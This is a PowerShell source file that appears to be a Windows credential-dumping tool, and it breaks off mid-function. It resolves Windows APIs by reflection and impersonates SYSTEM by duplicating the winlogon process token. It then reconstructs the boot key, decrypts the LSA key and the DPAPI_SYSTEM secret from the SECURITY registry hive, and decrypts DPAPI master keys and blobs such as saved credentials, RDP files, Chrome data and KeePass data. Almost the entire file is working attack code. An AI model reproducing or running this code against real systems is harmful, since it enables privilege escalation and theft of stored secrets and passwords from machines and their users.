function Invoke-FunctionLookup {
    param ([string] $moduleName, [string] $functionName)

    # Load the CLR helper type from System.dll
    $gacAsm = [AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\')[-1] -eq 'System.dll' }
    
    $helperType = $gacAsm.GetType('Microsoft.Win32.UnsafeNativeMethods')
    $ptrOverload = $helperType.GetMethod('GetProcAddress', [Reflection.BindingFlags]::Public -bor [Reflection.BindingFlags]::Static, $null, [Type[]] @([IntPtr], [string]),$null)

    if ($ptrOverload)
    {
        $moduleHandle = $helperType.GetMethod('GetModuleHandle').Invoke($null, @($moduleName))
        return $ptrOverload.Invoke($null, @($moduleHandle, $functionName))
    }

    # Fallback to HandleRef overload
    $handleRefOverload = $helperType.GetMethod('GetProcAddress', [Reflection.BindingFlags]::Public -bor [Reflection.BindingFlags]::Static, $null,[Type[]] @([System.Runtime.InteropServices.HandleRef], [string]),$null)
    if (-not $handleRefOverload)
    {
        throw 'Could not find a suitable GetProcAddress overload on this system.'
    }

    $moduleHandle = $helperType.GetMethod('GetModuleHandle').Invoke($null, @($moduleName))
    $handleRef = New-Object System.Runtime.InteropServices.HandleRef($null, $moduleHandle)
    return $handleRefOverload.Invoke($null, @($handleRef, $functionName))
}

function Invoke-GetDelegate {
    param ([Type[]] $parameterTypes, [Type] $returnType = [Void])

    # Create a dynamic in‑memory delegate type
    $asmName = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $asmBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($asmName, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $modBuilder = $asmBuilder.DefineDynamicModule('InMemoryModule', $false)

    $typeBuilder = $modBuilder.DefineType(
        'MyDelegateType',
        [System.Reflection.TypeAttributes]::Class -bor
        [System.Reflection.TypeAttributes]::Public -bor
        [System.Reflection.TypeAttributes]::Sealed -bor
        [System.Reflection.TypeAttributes]::AnsiClass -bor
        [System.Reflection.TypeAttributes]::AutoClass,
        [System.MulticastDelegate]
    )

    $ctor = $typeBuilder.DefineConstructor(
        [System.Reflection.MethodAttributes]::RTSpecialName -bor
        [System.Reflection.MethodAttributes]::HideBySig -bor
        [System.Reflection.MethodAttributes]::Public,
        [System.Reflection.CallingConventions]::Standard,
        $parameterTypes
    )
    $ctor.SetImplementationFlags([System.Reflection.MethodImplAttributes]::Runtime -bor
                                 [System.Reflection.MethodImplAttributes]::Managed)

    $invokeMethod = $typeBuilder.DefineMethod(
        'Invoke',
        [System.Reflection.MethodAttributes]::Public -bor
        [System.Reflection.MethodAttributes]::HideBySig -bor
        [System.Reflection.MethodAttributes]::NewSlot -bor
        [System.Reflection.MethodAttributes]::Virtual,
        $returnType,
        $parameterTypes
    )
    $invokeMethod.SetImplementationFlags([System.Reflection.MethodImplAttributes]::Runtime -bor
                                         [System.Reflection.MethodImplAttributes]::Managed)

    return $typeBuilder.CreateType()
}

$FnOpenProcess             = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName 'Kernel32.dll' -functionName 'OpenProcess'             ),(Invoke-GetDelegate @([UInt32],[bool],[UInt32])([IntPtr])))
$FnOpenProcessToken        = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName 'Advapi32.dll' -functionName 'OpenProcessToken'        ),(Invoke-GetDelegate @([IntPtr],[UInt32],[IntPtr].MakeByRefType())([bool])))
$FnDuplicateTokenEx        = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName 'Advapi32.dll' -functionName 'DuplicateTokenEx'        ),(Invoke-GetDelegate @([IntPtr],[UInt32],[IntPtr],[UInt32],[UInt32],[IntPtr].MakeByRefType())([bool])))
$FnImpersonateLoggedOnUser = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName 'Advapi32.dll' -functionName 'ImpersonateLoggedOnUser' ),(Invoke-GetDelegate @([IntPtr])([bool])))
$FnRegOpenKeyEx            = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName 'Advapi32.dll' -functionName 'RegOpenKeyExA'           ),(Invoke-GetDelegate @([Int32],[string],[Int32],[Int32],[IntPtr].MakeByRefType())([Int32])))
$FnRegQueryValueEx         = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName 'Advapi32.dll' -functionName 'RegQueryValueExA'        ),(Invoke-GetDelegate @([IntPtr],[string],[IntPtr],[UInt32].MakeByRefType(),[IntPtr],[UInt32].MakeByRefType())([Int32])))
$FnRegQueryInfoKey         = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName 'Advapi32.dll' -functionName 'RegQueryInfoKeyA'        ),(Invoke-GetDelegate @([Int32],[System.Text.StringBuilder],[Int32].MakeByRefType(),[Int32],[Int32].MakeByRefType(),[Int32].MakeByRefType(),[Int32].MakeByRefType(),[Int32].MakeByRefType(),[Int32].MakeByRefType(),[Int32].MakeByRefType(),[Int32].MakeByRefType(),[IntPtr])([Int32])))
$FnRegCloseKey             = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName 'Advapi32.dll' -functionName 'RegCloseKey'             ),(Invoke-GetDelegate @([Int32])([Int32])))
$FnRevertToSelf            = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName 'Advapi32.dll' -functionName 'RevertToSelf'            ),(Invoke-GetDelegate -parameterTypes $null -returnType ([bool])))



function Invoke-Impersonate {

    $currentSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
    
    if ($currentSid -eq 'S-1-5-18')
    { 
        return $true 
    }

    $winlogonId = (Get-Process -Name 'winlogon' -ErrorAction Stop | Select-Object -First 1 -ExpandProperty Id)
    
    $processHandle = $FnOpenProcess.Invoke(0x400, $true, [int]$winlogonId)
    
    if ($processHandle -eq [IntPtr]::Zero) 
    { 
        return $false
    }

    $tokenHandle = [IntPtr]::Zero
    
    if (-not $FnOpenProcessToken.Invoke($processHandle, 0x0E, [ref]$tokenHandle))
    { 
        return $false
    }

    $dupHandle = [IntPtr]::Zero
    
    if (-not $FnDuplicateTokenEx.Invoke($tokenHandle, 0x02000000, [IntPtr]::Zero, 0x02, 0x01, [ref]$dupHandle))
    { 
        return $false
    }

    try {
        
        if (-not $FnImpersonateLoggedOnUser.Invoke($dupHandle))
        { 
            return $false
        }
        
        $newSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
        
        return ($newSid -eq 'S-1-5-18')
    }
    
    catch
    {
        return $false
    }
}


# Taken from this project https://raw.githubusercontent.com/tmenochet/PowerDump/refs/heads/master/DpapiDump.ps1

if (-not [Type]::GetType('Pbkdf2', $false, $false)) {
Add-Type -TypeDefinition @"
using System;
using System.Security.Cryptography;

public class Pbkdf2 {
    public Pbkdf2(HMAC algorithm, Byte[] password, Byte[] salt, Int32 iterations) {
        if (algorithm == null) { throw new ArgumentNullException("algorithm", "Algorithm cannot be null."); }
        if (salt == null) { throw new ArgumentNullException("salt", "Salt cannot be null."); }
        if (password == null) { throw new ArgumentNullException("password", "Password cannot be null."); }
        this.Algorithm = algorithm;
        this.Algorithm.Key = password;
        this.Salt = salt;
        this.IterationCount = iterations;
        this.BlockSize = this.Algorithm.HashSize / 8;
        this.BufferBytes = new byte[this.BlockSize];
    }
    
    private readonly int BlockSize;
    private uint BlockIndex = 1;
    private byte[] BufferBytes;
    private int BufferStartIndex = 0;
    private int BufferEndIndex = 0;
    
    public HMAC Algorithm { get; private set; }
    public Byte[] Salt { get; private set; }
    public Int32 IterationCount { get; private set; }
    
    public Byte[] GetBytes(int count, string algorithm = "sha512") {
        byte[] result = new byte[count];
        int resultOffset = 0;
        int bufferCount = this.BufferEndIndex - this.BufferStartIndex;

        if (bufferCount > 0) {
            if (count < bufferCount) {
                Buffer.BlockCopy(this.BufferBytes, this.BufferStartIndex, result, 0, count);
                this.BufferStartIndex += count;
                return result;
            }
            Buffer.BlockCopy(this.BufferBytes, this.BufferStartIndex, result, 0, bufferCount);
            this.BufferStartIndex = this.BufferEndIndex = 0;
            resultOffset += bufferCount;
        }
        
        while (resultOffset < count) {
            int needCount = count - resultOffset;
            if (algorithm.ToLower() == "sha256")
                this.BufferBytes = this.Func(false);
            else
                this.BufferBytes = this.Func();
                
            if (needCount > this.BlockSize) {
                Buffer.BlockCopy(this.BufferBytes, 0, result, resultOffset, this.BlockSize);
                resultOffset += this.BlockSize;
            } else {
                Buffer.BlockCopy(this.BufferBytes, 0, result, resultOffset, needCount);
                this.BufferStartIndex = needCount;
                this.BufferEndIndex = this.BlockSize;
                return result;
            }
        }
        return result;
    }
    
    private byte[] Func(bool mscrypto = true) {
        var hash1Input = new byte[this.Salt.Length + 4];
        Buffer.BlockCopy(this.Salt, 0, hash1Input, 0, this.Salt.Length);
        Buffer.BlockCopy(GetBytesFromInt(this.BlockIndex), 0, hash1Input, this.Salt.Length, 4);
        var hash1 = this.Algorithm.ComputeHash(hash1Input);
        byte[] finalHash = hash1;
        
        for (int i = 2; i <= this.IterationCount; i++) {
            hash1 = this.Algorithm.ComputeHash(hash1, 0, hash1.Length);
            for (int j = 0; j < this.BlockSize; j++) {
                finalHash[j] = (byte)(finalHash[j] ^ hash1[j]);
            }
            if (mscrypto)
                Array.Copy(finalHash, hash1, hash1.Length);
        }
        
        if (this.BlockIndex == uint.MaxValue) { 
            throw new InvalidOperationException("Derived key too long."); 
        }
        this.BlockIndex += 1;
        return finalHash;
    }
    
    private static byte[] GetBytesFromInt(uint i) {
        var bytes = BitConverter.GetBytes(i);
        if (BitConverter.IsLittleEndian) {
            return new byte[] { bytes[3], bytes[2], bytes[1], bytes[0] };
        } else {
            return bytes;
        }
    }
}
"@ -ReferencedAssemblies System.Security
}



function Get-BootKey {

    # Retrieves the boot key by querying specific registry keys under SYSTEM hive and descrambles it. Returns the boot key as a byte array.
    # Hand-off: Returns boot key to Get-LSAKey function.

    $ScrambledKey = [System.Text.StringBuilder]::new()
    $keyNames     = @("JD", "Skew1", "GBG", "Data")

    foreach ($Key in $keyNames)
    {
        [string] $KeyPath = "SYSTEM\\CurrentControlSet\\Control\\Lsa\\$Key"
        $ClassVal         = [System.Text.StringBuilder]::new(1024)
        $Len              = 1024
        $hKey             = [IntPtr]::Zero
        $dummy            = [IntPtr]::Zero

        $Result = $FnRegOpenKeyEx.Invoke(0x80000002, $KeyPath, 0x0, 0x19, [ref]$hKey)
        
        if ($Result -ne 0)
        {
            $ErrCode = [System.Runtime.Interopservices.Marshal]::GetLastWin32Error()
            Write-Host "[!] Error opening $KeyPath : $ErrCode"
            return $null
        }

        $Result = $FnRegQueryInfoKey.Invoke($hKey, $ClassVal, [ref]$Len, 0x0, [ref]$null, [ref]$null, [ref]$null, [ref]$null, [ref]$null, [ref]$null, [ref]$null, [IntPtr]::Zero)
        
        if ($Result -ne 0)
        {
            $ErrCode = [System.Runtime.Interopservices.Marshal]::GetLastWin32Error()
            Write-Host "[!] Error querying $KeyPath : $ErrCode"
            return $null
        }

        $FnRegCloseKey.Invoke($hKey)    > $null
        $ScrambledKey.Append($ClassVal) > $null
    }

    $Descramble = @(0x8, 0x5, 0x4, 0x2, 0xB, 0x9, 0xD, 0x3, 0x0, 0x6, 0x1, 0xC, 0xE, 0xA, 0xF, 0x7)
    $BootKey    = foreach ($i in $Descramble) { [Convert]::ToByte("$($ScrambledKey[$i * 2])$($ScrambledKey[$i * 2 + 1])", 16) }
    $HexString  = ($BootKey | ForEach-Object { $_.ToString("X2") }) -join ""

    return $BootKey
}

function Get-LsaSha256Hash {
    param ([byte[]] $Key, [byte[]] $RawData)

    # Computes a SHA256 hash of a key combined with repeated raw data. Used for deriving encryption keys in LSA decryption.
    # Hand-off: Returns hash to Get-LSAKey/Get-LSASecret for key derivation.

    $bufferSize = $Key.Length + ($RawData.Length * 1000)
    $buffer     = New-Object byte[] $bufferSize
    [System.Array]::Copy($Key, 0, $buffer, 0, $Key.Length)

    for ($i = 0; $i -lt 1000; $i++)
    {
        $dest = $Key.Length + ($i * $RawData.Length)
        [System.Array]::Copy($RawData, 0, $buffer, $dest, $RawData.Length)
    }

    $sha256 = [System.Security.Cryptography.SHA256]::Create()
    
    try
    { 
        return $sha256.ComputeHash($buffer) 
    }
    
    finally
    { 
        $sha256.Dispose()
    }
}

function Get-LsaAesDecrypt {
    param ([byte[]] $Key,[byte[]] $Data)

    # Decrypts AES-CBC encrypted data using a provided key and zero IV. Handles data in 16-byte chunks.
    # Hand-off: Returns decrypted data to Get-LSAKey/Get-LSASecret for LSA secret extraction.

    $aes = [System.Security.Cryptography.AesManaged]::new()
    try 
    {
        $aes.Key       = $Key
        $aes.IV        = New-Object byte[] 16
        $aes.Mode      = [System.Security.Cryptography.CipherMode]::CBC
        $aes.BlockSize = 128
        $aes.Padding   = [System.Security.Cryptography.PaddingMode]::Zeros

        $transform     = $aes.CreateDecryptor()
        $chunks        = [int][math]::Ceiling($Data.Length / 16)
        $plaintext     = New-Object byte[] ($chunks * 16)

        for ($i = 0; $i -lt $chunks; $i++) 
        {
            $offset        = $i * 16
            $chunk         = New-Object byte[] 16
            [System.Array]::Copy($Data, $offset, $chunk, 0, 16)
            $decryptedChunk = $transform.TransformFinalBlock($chunk, 0, 16)
            [System.Array]::Copy($decryptedChunk, 0, $plaintext, $offset, 16)
        }

        return $plaintext
    }
    
    finally 
    {
        $transform.Dispose()
        $aes.Dispose()
    }
}

function Get-LSAKey {

    # Derives the LSA encryption key using the boot key and encrypted registry data from SECURITY hive.
    # Hand-off: Uses Get-BootKey, passes data to Get-LsaSha256Hash/Get-LsaAesDecrypt. Returns LSA key to Get-LSASecret.

    $BootKey                      = Get-BootKey
    $LSAKeyEncryptedStruct        = Get-ItemPropertyValue -Path "HKLM:\SECURITY\Policy\PolEKList" -Name "(default)"
    $LSAEncryptedData             = $LSAKeyEncryptedStruct[28..($LSAKeyEncryptedStruct.Length - 1)]
    $LSAEncryptedDataEncryptedKey = $LSAEncryptedData[0..31]
    $tmpKey                       = Get-LsaSha256Hash -Key $BootKey -RawData $LSAEncryptedDataEncryptedKey
    $LSAEncryptedDataRemainder    = $LSAEncryptedData[32..($LSAEncryptedData.Length - 1)]
    $LSAKeyStructPlaintext        = Get-LsaAesDecrypt -Key $tmpKey -Data $LSAEncryptedDataRemainder
    $LSAKey                       = New-Object byte[] 32
    [System.Array]::Copy($LSAKeyStructPlaintext, 68, $LSAKey, 0, 32)

    function ToHex($bytes) { ($bytes | ForEach-Object { $_.ToString("X2") }) -join '' }
    Write-Host "[*] BootKey : $(ToHex $BootKey)"
    Write-Host "[*] tmpKey  : $(ToHex $tmpKey)"
    Write-Host "[*] LSA Key : $(ToHex $LSAKey)"

    return $LSAKey
}

function Get-LSASecret {
    param ([string] $SecretName)

    # Retrieves and decrypts a specified LSA secret from the registry using the LSA key.
    # Hand-off: Uses Get-LSAKey, passes data to Get-LsaSha256Hash/Get-LsaAesDecrypt. Returns DPAPI_SYSTEM secret to Get-DPAPIKeys.

    $LSAKey       = Get-LSAKey
    $RegistryPath = "HKLM:\SECURITY\Policy\Secrets\$SecretName\CurrVal"

    try 
    {
        $RegistryKey = Get-Item -Path $RegistryPath -ErrorAction Stop
        $KeyData     = $RegistryKey.GetValue("")

        if (-not $KeyData -or $KeyData.Length -lt 28)
        {
            Write-Warning "Invalid registry data for $SecretName"
            return $null
        }

        $keyEncryptedData             = $keyData[28..($keyData.Length-1)]
        $keyEncryptedDataEncryptedKey = $keyEncryptedData[0..31]
        $tmpKey                       = Get-LSASHA256Hash -Key $LSAKey -RawData $keyEncryptedDataEncryptedKey
        $keyEncryptedDataRemainder    = $keyEncryptedData[32..($keyEncryptedData.Length-1)]
        $keyPathPlaintext             = Get-LsaAesDecrypt -Key $tmpKey -Data $keyEncryptedDataRemainder

        if ($SecretName -eq "DPAPI_SYSTEM") 
        {
            return $keyPathPlaintext[20..59]
        }

        Write-Warning "LSA Secret '$SecretName' not implemented"
        return $null
    }
    
    catch 
    {
        Write-Warning "Error accessing registry: $_"
        return $null
    }
}

function Get-DPAPIKeys {

    # Extracts machine and user DPAPI keys from the decrypted DPAPI_SYSTEM secret.
    # Hand-off: Uses Get-LSASecret. Stores keys in script variables for later use by Triage-SystemMasterKeys.

    $dpapiKeyFull                 = Get-LSASecret -SecretName "DPAPI_SYSTEM"
    $script:dpapiMachineKeysBytes = New-Object byte[] 20
    $script:dpapiUserKeysBytes    = New-Object byte[] 20

    [System.Array]::Copy($dpapiKeyFull,  0, $script:dpapiMachineKeysBytes, 0, 20)
    [System.Array]::Copy($dpapiKeyFull, 20, $script:dpapiUserKeysBytes   , 0, 20)

    function ToHex($bytes) { ($bytes | ForEach-Object { $_.ToString("X2") }) -join '' }

    Write-Host ""
    Write-Host "[*] Secret  : DPAPI_SYSTEM"
    Write-Host "[*] Full    : $(( $dpapiKeyFull                 | ForEach-Object { $_.ToString('X2') } ) -join '')"
    Write-Host "[*] Machine : $(( $script:dpapiMachineKeysBytes | ForEach-Object { $_.ToString('X2') } ) -join '')"
    Write-Host "[*] User    : $(( $script:dpapiUserKeysBytes    | ForEach-Object { $_.ToString('X2') } ) -join '')"
    Write-Host ""
}

function Get-MasterKey {
    param ([byte[]] $masterKeyBytes)

    # Extracts and validates the master key length from DPAPI master key bytes.
    # Hand-off: Called by Decrypt-MasterKeyWithSha to process master key structures.

    $offset           = 96
    $masterKeyLength  = [System.BitConverter]::ToInt64($masterKeyBytes, $offset)
    $offset          += 4 * 8

    if ($masterKeyLength -lt 0 -or $masterKeyLength -gt 1048576)
    {
        return "[!] MasterKeyLength value $masterKeyLength is invalid or suspicious"
    }

    $masterKeySubBytes = New-Object byte[] ([int]$masterKeyLength)
    [System.Array]::Copy($masterKeyBytes, $offset, $masterKeySubBytes, 0, [int]$masterKeyLength)
    return $masterKeySubBytes
}

function Derive-PreKey {
    param ([byte[]] $shaBytes, [uint32] $algHash, [byte[]] $salt, [int] $rounds)

    # Derives a pre-key using PBKDF2 with HMAC-SHA1/SHA512 for DPAPI master key decryption.
    # Hand-off: Returns derived key to Decrypt-MasterKeyWithSha for decryption operations.

    switch ($algHash)
    {
        32782
        {
            $hmac = [System.Security.Cryptography.HMACSHA512]::new()
            $df   = [Pbkdf2]::new($hmac, $shaBytes, $salt, $rounds)
            $derivedPreKey = $df.GetBytes(48, "sha512")
            break
        }
        32777
        {
            $hmac = [System.Security.Cryptography.HMACSHA1]::new()
            $df   = [Pbkdf2]::new($hmac, $shaBytes, $salt, $rounds)
            $derivedPreKey = $df.GetBytes(32, "sha1")
            break
        }
        default
        {
            throw "Unsupported algHash: $algHash"
        }
    }

    return $derivedPreKey
}




function Decrypt-Aes256HmacSha512 {
    param ([byte[]] $ShaBytes, [byte[]] $Final, [byte[]] $EncData)

    # Decrypts AES-256-CBC data with HMAC-SHA512 integrity check. Used for newer DPAPI master keys.
    # Hand-off: Returns SHA1 of decrypted master key to Decrypt-MasterKeyWithSha.

    # Key and IV setup
    $HMACLen    = [System.Security.Cryptography.HMACSHA512]::new().HashSize / 8
    $IVBytes    = New-Object byte[] 16
    $key        = New-Object byte[] 32
    [Array]::Copy($Final, 32, $IVBytes, 0, 16)
    [Array]::Copy($Final, 0, $key, 0, 32)

    # AES Decrypt
    $aes        = New-Object Security.Cryptography.AesManaged
    $aes.Key    = $key
    $aes.IV     = $IVBytes
    $aes.Mode   = [Security.Cryptography.CipherMode]::CBC
    $aes.Padding= [Security.Cryptography.PaddingMode]::Zeros
    $dec        = $aes.CreateDecryptor()
    $plain      = $dec.TransformFinalBlock($EncData, 0, $EncData.Length)

    # HMAC and SHA
    $outLen     = $plain.Length
    $outputLen  = $outLen - 16 - $HMACLen
    $mkFull     = New-Object byte[] $HMACLen
    [Array]::Copy($plain, $outLen - $outputLen, $mkFull, 0, $mkFull.Length)
    $sha1       = [System.Security.Cryptography.SHA1Managed]::Create()
    $mkSha1     = $sha1.ComputeHash($mkFull)

    $cryptBuf   = New-Object byte[] 16
    [Array]::Copy($plain, $cryptBuf, 16)
    $hmac1      = [System.Security.Cryptography.HMACSHA512]::new($ShaBytes)
    $r1Hmac     = $hmac1.ComputeHash($cryptBuf)

    $r2Buf      = New-Object byte[] $outputLen
    [Array]::Copy($plain, $outLen - $outputLen, $r2Buf, 0, $outputLen)
    $hmac2      = [System.Security.Cryptography.HMACSHA512]::new($r1Hmac)
    $r2Hmac     = $hmac2.ComputeHash($r2Buf)

    $cmp        = New-Object byte[] 64
    [Array]::Copy($plain, 16, $cmp, 0, $cmp.Length)

    if (-not [System.Linq.Enumerable]::SequenceEqual($cmp, $r2Hmac))
    {
        throw "HMAC integrity check failed!"
    }

    return $mkSha1
}



function Decrypt-TripleDESHmac {
    param ([byte[]] $Final, [byte[]] $EncData)

    # Decrypts 3DES data with custom HMAC handling. Used for older DPAPI master keys.
    # Hand-off: Returns SHA1 of decrypted master key to Decrypt-MasterKeyWithSha.

    $ivBytes    = New-Object byte[] 8
    $key        = New-Object byte[] 24
    [Array]::Copy($Final, 24, $ivBytes, 0, 8)
    [Array]::Copy($Final, 0, $key, 0, 24)

    $des        = New-Object Security.Cryptography.TripleDESCryptoServiceProvider
    $des.Key    = $key
    $des.IV     = $ivBytes
    $des.Mode   = [Security.Cryptography.CipherMode]::CBC
    $des.Padding= [Security.Cryptography.PaddingMode]::Zeros

    $decryptor      = $des.CreateDecryptor()
    $plaintextBytes = $decryptor.TransformFinalBlock($EncData, 0, $EncData.Length)

    $decryptedKey   = New-Object byte[] 64
    [Array]::Copy($plaintextBytes, 40, $decryptedKey, 0, 64)

    $sha1           = New-Object Security.Cryptography.SHA1Managed
    $masterKeySha1  = $sha1.ComputeHash($decryptedKey)

    return $masterKeySha1
}

function Decrypt-MasterKeyWithSha {
    param ([byte[]] $MasterKeyBytes,[byte[]] $SHABytes)

    # Orchestrates DPAPI master key decryption using derived keys and algorithm-specific functions.
    # Hand-off: Calls Derive-PreKey and algorithm-specific decryptors. Returns GUID:key mapping to Triage-SystemMasterKeys.

    $guid       = '{' + [System.Text.Encoding]::Unicode.GetString($MasterKeyBytes, 12, 72) + '}'
    $mkBytes    = Get-MasterKey $MasterKeyBytes

    $offset     = 4
    $salt       = New-Object byte[] 16
    [Array]::Copy($mkBytes, $offset, $salt, 0, 16)
    $offset    += 16

    $rounds     = [BitConverter]::ToInt32($mkBytes, $offset)
    $offset    += 4

    $algHash    = [BitConverter]::ToUInt32($mkBytes, $offset)
    $offset    += 4

    $algCrypt   = [BitConverter]::ToUInt32($mkBytes, $offset)
    $offset    += 4

    $encData    = New-Object byte[] ($mkBytes.Length - $offset)
    [Array]::Copy($mkBytes, $offset, $encData, 0, $encData.Length)

    $derivedPreKey = Derive-PreKey -shaBytes $SHABytes -algHash $algHash -salt $salt -rounds $rounds

    if ($algCrypt -eq 26128 -and $algHash -eq 32782)
    {
        
        # CALG_AES_256 with CALG_SHA_512
        $masterKeySha1 = Decrypt-Aes256HmacSha512 -ShaBytes $shaBytes -Final $derivedPreKey -EncData $encData
        $masterKeyStr  = ($masterKeySha1 | ForEach-Object { $_.ToString("X2") }) -join ""
        return @{ $guid = $masterKeyStr }
    }
    
    elseif ($algCrypt -eq 26115 -and ($algHash -eq 32777 -or $algHash -eq 32772)) 
    {
        
        # CALG_3DES with CALG_HMAC or CALG_SHA1
        $masterKeySha1 = Decrypt-TripleDESHmac -Final $derivedPreKey -EncData $encData
        $masterKeyStr  = ($masterKeySha1 | ForEach-Object { $_.ToString("X2") }) -join ""
        return @{ $guid = $masterKeyStr }
    }
    
    else 
    {
        throw "Alg crypt '$algCrypt / 0x{0:X8}' not currently supported!" -f $algCrypt
    }
}



function Describe-DPAPIBlob {
    param ([byte[]]$blobBytes, [hashtable] $MasterKeys,[string] $blobType = "blob",[bool] $unprotect = $false, [byte[]] $entropy = $null)

    # Parses and decrypts DPAPI blobs (credentials, RDG files, etc.) using provided master keys.
    # Hand-off: Uses MasterKeys hashtable. Returns decrypted data to Decrypt-NAA.

    $offset = 0
    
    if ($blobType -eq "credential")
    { 
        $offset = 36
    }
    
    elseif ($blobType -in @("policy","blob","rdg","chrome","keepass"))
    { 
        $offset = 24
    }
    
    else 
    {
        Write-Host "[!] Unsupported blob type: $blobType"
        return ,@()
    }

    $guidMasterKey = [Guid]::new([byte[]]$blobBytes[$offset..($offset+15)])
    $guidString    = "{$guidMasterKey}"
    $offset       += 16

    if ($blobType -notin "rdg","chrome")
    {
        Write-Host "    guidMasterKey    : $guidString"
        Write-Host "    size             : $($blobBytes.Length)"
    }

    $flags    = [BitConverter]::ToUInt32($blobBytes, $offset)
    $offset  += 4
    
    if ($blobType -notin "rdg","chrome")
    {
        $flagInfo = "0x$($flags.ToString('X8'))"
        
        if ($flags -eq 0x20000000)
        { 
            $flagInfo += " (CRYPTPROTECT_SYSTEM)"
        }
        
        Write-Host "    flags            : $flagInfo"
    }

    $descLength   = [BitConverter]::ToInt32($blobBytes, $offset)
    $offset      += 4
    $description  = [System.Text.Encoding]::Unicode.GetString($blobBytes, $offset, $descLength)
    $offset      += $descLength

    $algCrypt     = [BitConverter]::ToInt32($blobBytes, $offset)
    $offset      += 4
    $algCryptLen  = [BitConverter]::ToInt32($blobBytes, $offset)
    $offset      += 4
    $saltLen      = [BitConverter]::ToInt32($blobBytes, $offset)
    $offset      += 4
    $saltBytes    = $blobBytes[$offset..($offset+$saltLen-1)]
    $offset      += $saltLen

    $hmacKeyLen   = [BitConverter]::ToInt32($blobBytes, $offset)
    $offset      += 4 + $hmacKeyLen
    $algHash      = [BitConverter]::ToInt32($blobBytes, $offset)
    $offset      += 4

    if ($blobType -notin "rdg","chrome")
    {
        Write-Host "    algHash/algCrypt : $algHash ($([CryptAlg]$algHash)) / $algCrypt ($([CryptAlg]$algCrypt))"
        Write-Host "    description      : $description"
    }

    $algHashLen   = [BitConverter]::ToInt32($blobBytes, $offset)
    $offset      += 4
    $hmac2KeyLen  = [BitConverter]::ToInt32($blobBytes, $offset)
    $offset      += 4 + $hmac2KeyLen

    $dataLen      = [BitConverter]::ToInt32($blobBytes, $offset)
    $offset      += 4
    $dataBytes    = $blobBytes[$offset..($offset+$dataLen-1)]

    if ($unprotect -and $blobType -in "blob","rdg","chrome","keepass")
    {
        try
        {
            return [System.Security.Cryptography.ProtectedData]::Unprotect($blobBytes,$entropy,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        }
        
        catch
        {
            return [System.Text.Encoding]::Unicode.GetBytes("MasterKey needed - $guidString")
        }
    }

    if ($MasterKeys.ContainsKey($guidString))
    {
        $keyBytes = [System.Collections.Generic.List[byte]]::new()
        
        for ($i = 0; $i -lt $MasterKeys[$guidString].Length; $i += 2)
        {
            $keyBytes.Add([Convert]::ToByte($MasterKeys[$guidString].Substring($i, 2), 16))
        }
        
        $keyBytes = $keyBytes.ToArray()

        try 
        {
            $hmac = $null
            
            if($algHash -eq 32772)
            { 
                $hmac = [System.Security.Cryptography.HMACSHA1]::new($keyBytes)
            }
            
            elseif ($algHash -eq 32782)
            { 
                $hmac = [System.Security.Cryptography.HMACSHA512]::new($keyBytes)
            }
            
            else 
            {
                Write-Host "    [!] Unsupported hash algorithm: $algHash"
                return ,@()
            }

            $inputBytes      = $saltBytes
            
            if ($entropy)
            { 
                $inputBytes += $entropy
            }
            
            $derivedKeyBytes = $hmac.ComputeHash($inputBytes)
            $hmac.Dispose()

            $keySize         = $algCryptLen / 8
            $finalKeyBytes   = $derivedKeyBytes[0..($keySize-1)]

            $padding         = if ($blobType -eq "credential") { "PKCS7" } else { "None" }
            $decrypted       = Decrypt-Blob -ciphertext $dataBytes -key $finalKeyBytes -algId $algCrypt

            if ($blobType -eq "credential")
            {
                # I dont think we are missing anything by redacting this. Its produces alot of garbage around the data anyway. Should loop back to this later
                #$decText = [System.Text.Encoding]::Unicode.GetString($decrypted)
                #Write-Host "    dec(blob)        : $decText"
            }

            return $decrypted
        }
        
        catch
        {
            Write-Host "    [X] Error during decryption: $_"
        }
    }
    
    else
    {
        if ($blobType -in "rdg","chrome")
        {
            return [System.Text.Encoding]::Unicode.GetBytes("MasterKey needed - $guidString")
        }
        
        else
        {
            Write-Host "    [!] MasterKey GUID not in cache: $guidString"
        }
    }

    return ,@()
}

function Decrypt-Blob {
    param ([byte[]] $ciphertext, [byte[]] $key,[int] $algId)
    
    # Decrypts ciphertext using 3DES or AES-256 based on algorithm ID. Helper for Describe-DPAPIBlob.
    # Hand-off: Returns plaintext to Describe-DPAPIBlob.

    switch ($algId) {
        26115 {  # CALG_3DES
            $ivBytes    = New-Object byte[] 8
            $des        = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider
            $des.Key    = $key
            $des.IV     = $ivBytes
            $des.Mode   = [System.Security.Cryptography.CipherMode]::CBC
            $des.Padding= [System.Security.Cryptography.PaddingMode]::Zeros

            try
            {
                $decryptor = $des.CreateDecryptor()
                return $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
            }
            
            catch
            {
                Write-Warning "3DES decryption failed: $_"
                return $null
            }
            
            finally
            {
                
                if ($des)
                { 
                    $des.Dispose()
                }
            }
        }
        
        26128 {  # CALG_AES_256
            $ivBytes    = New-Object byte[] 16
            $aes        = New-Object System.Security.Cryptography.AesManaged
            $aes.Key    = $key
            $aes.IV     = $ivBytes
            $aes.Mode   = [System.Security.Cryptography.CipherMode]::CBC
            $aes.Padding= [System.Security.Cryptography.PaddingMode]::Zeros

            try
            {
                $decryptor = $aes.CreateDecryptor()
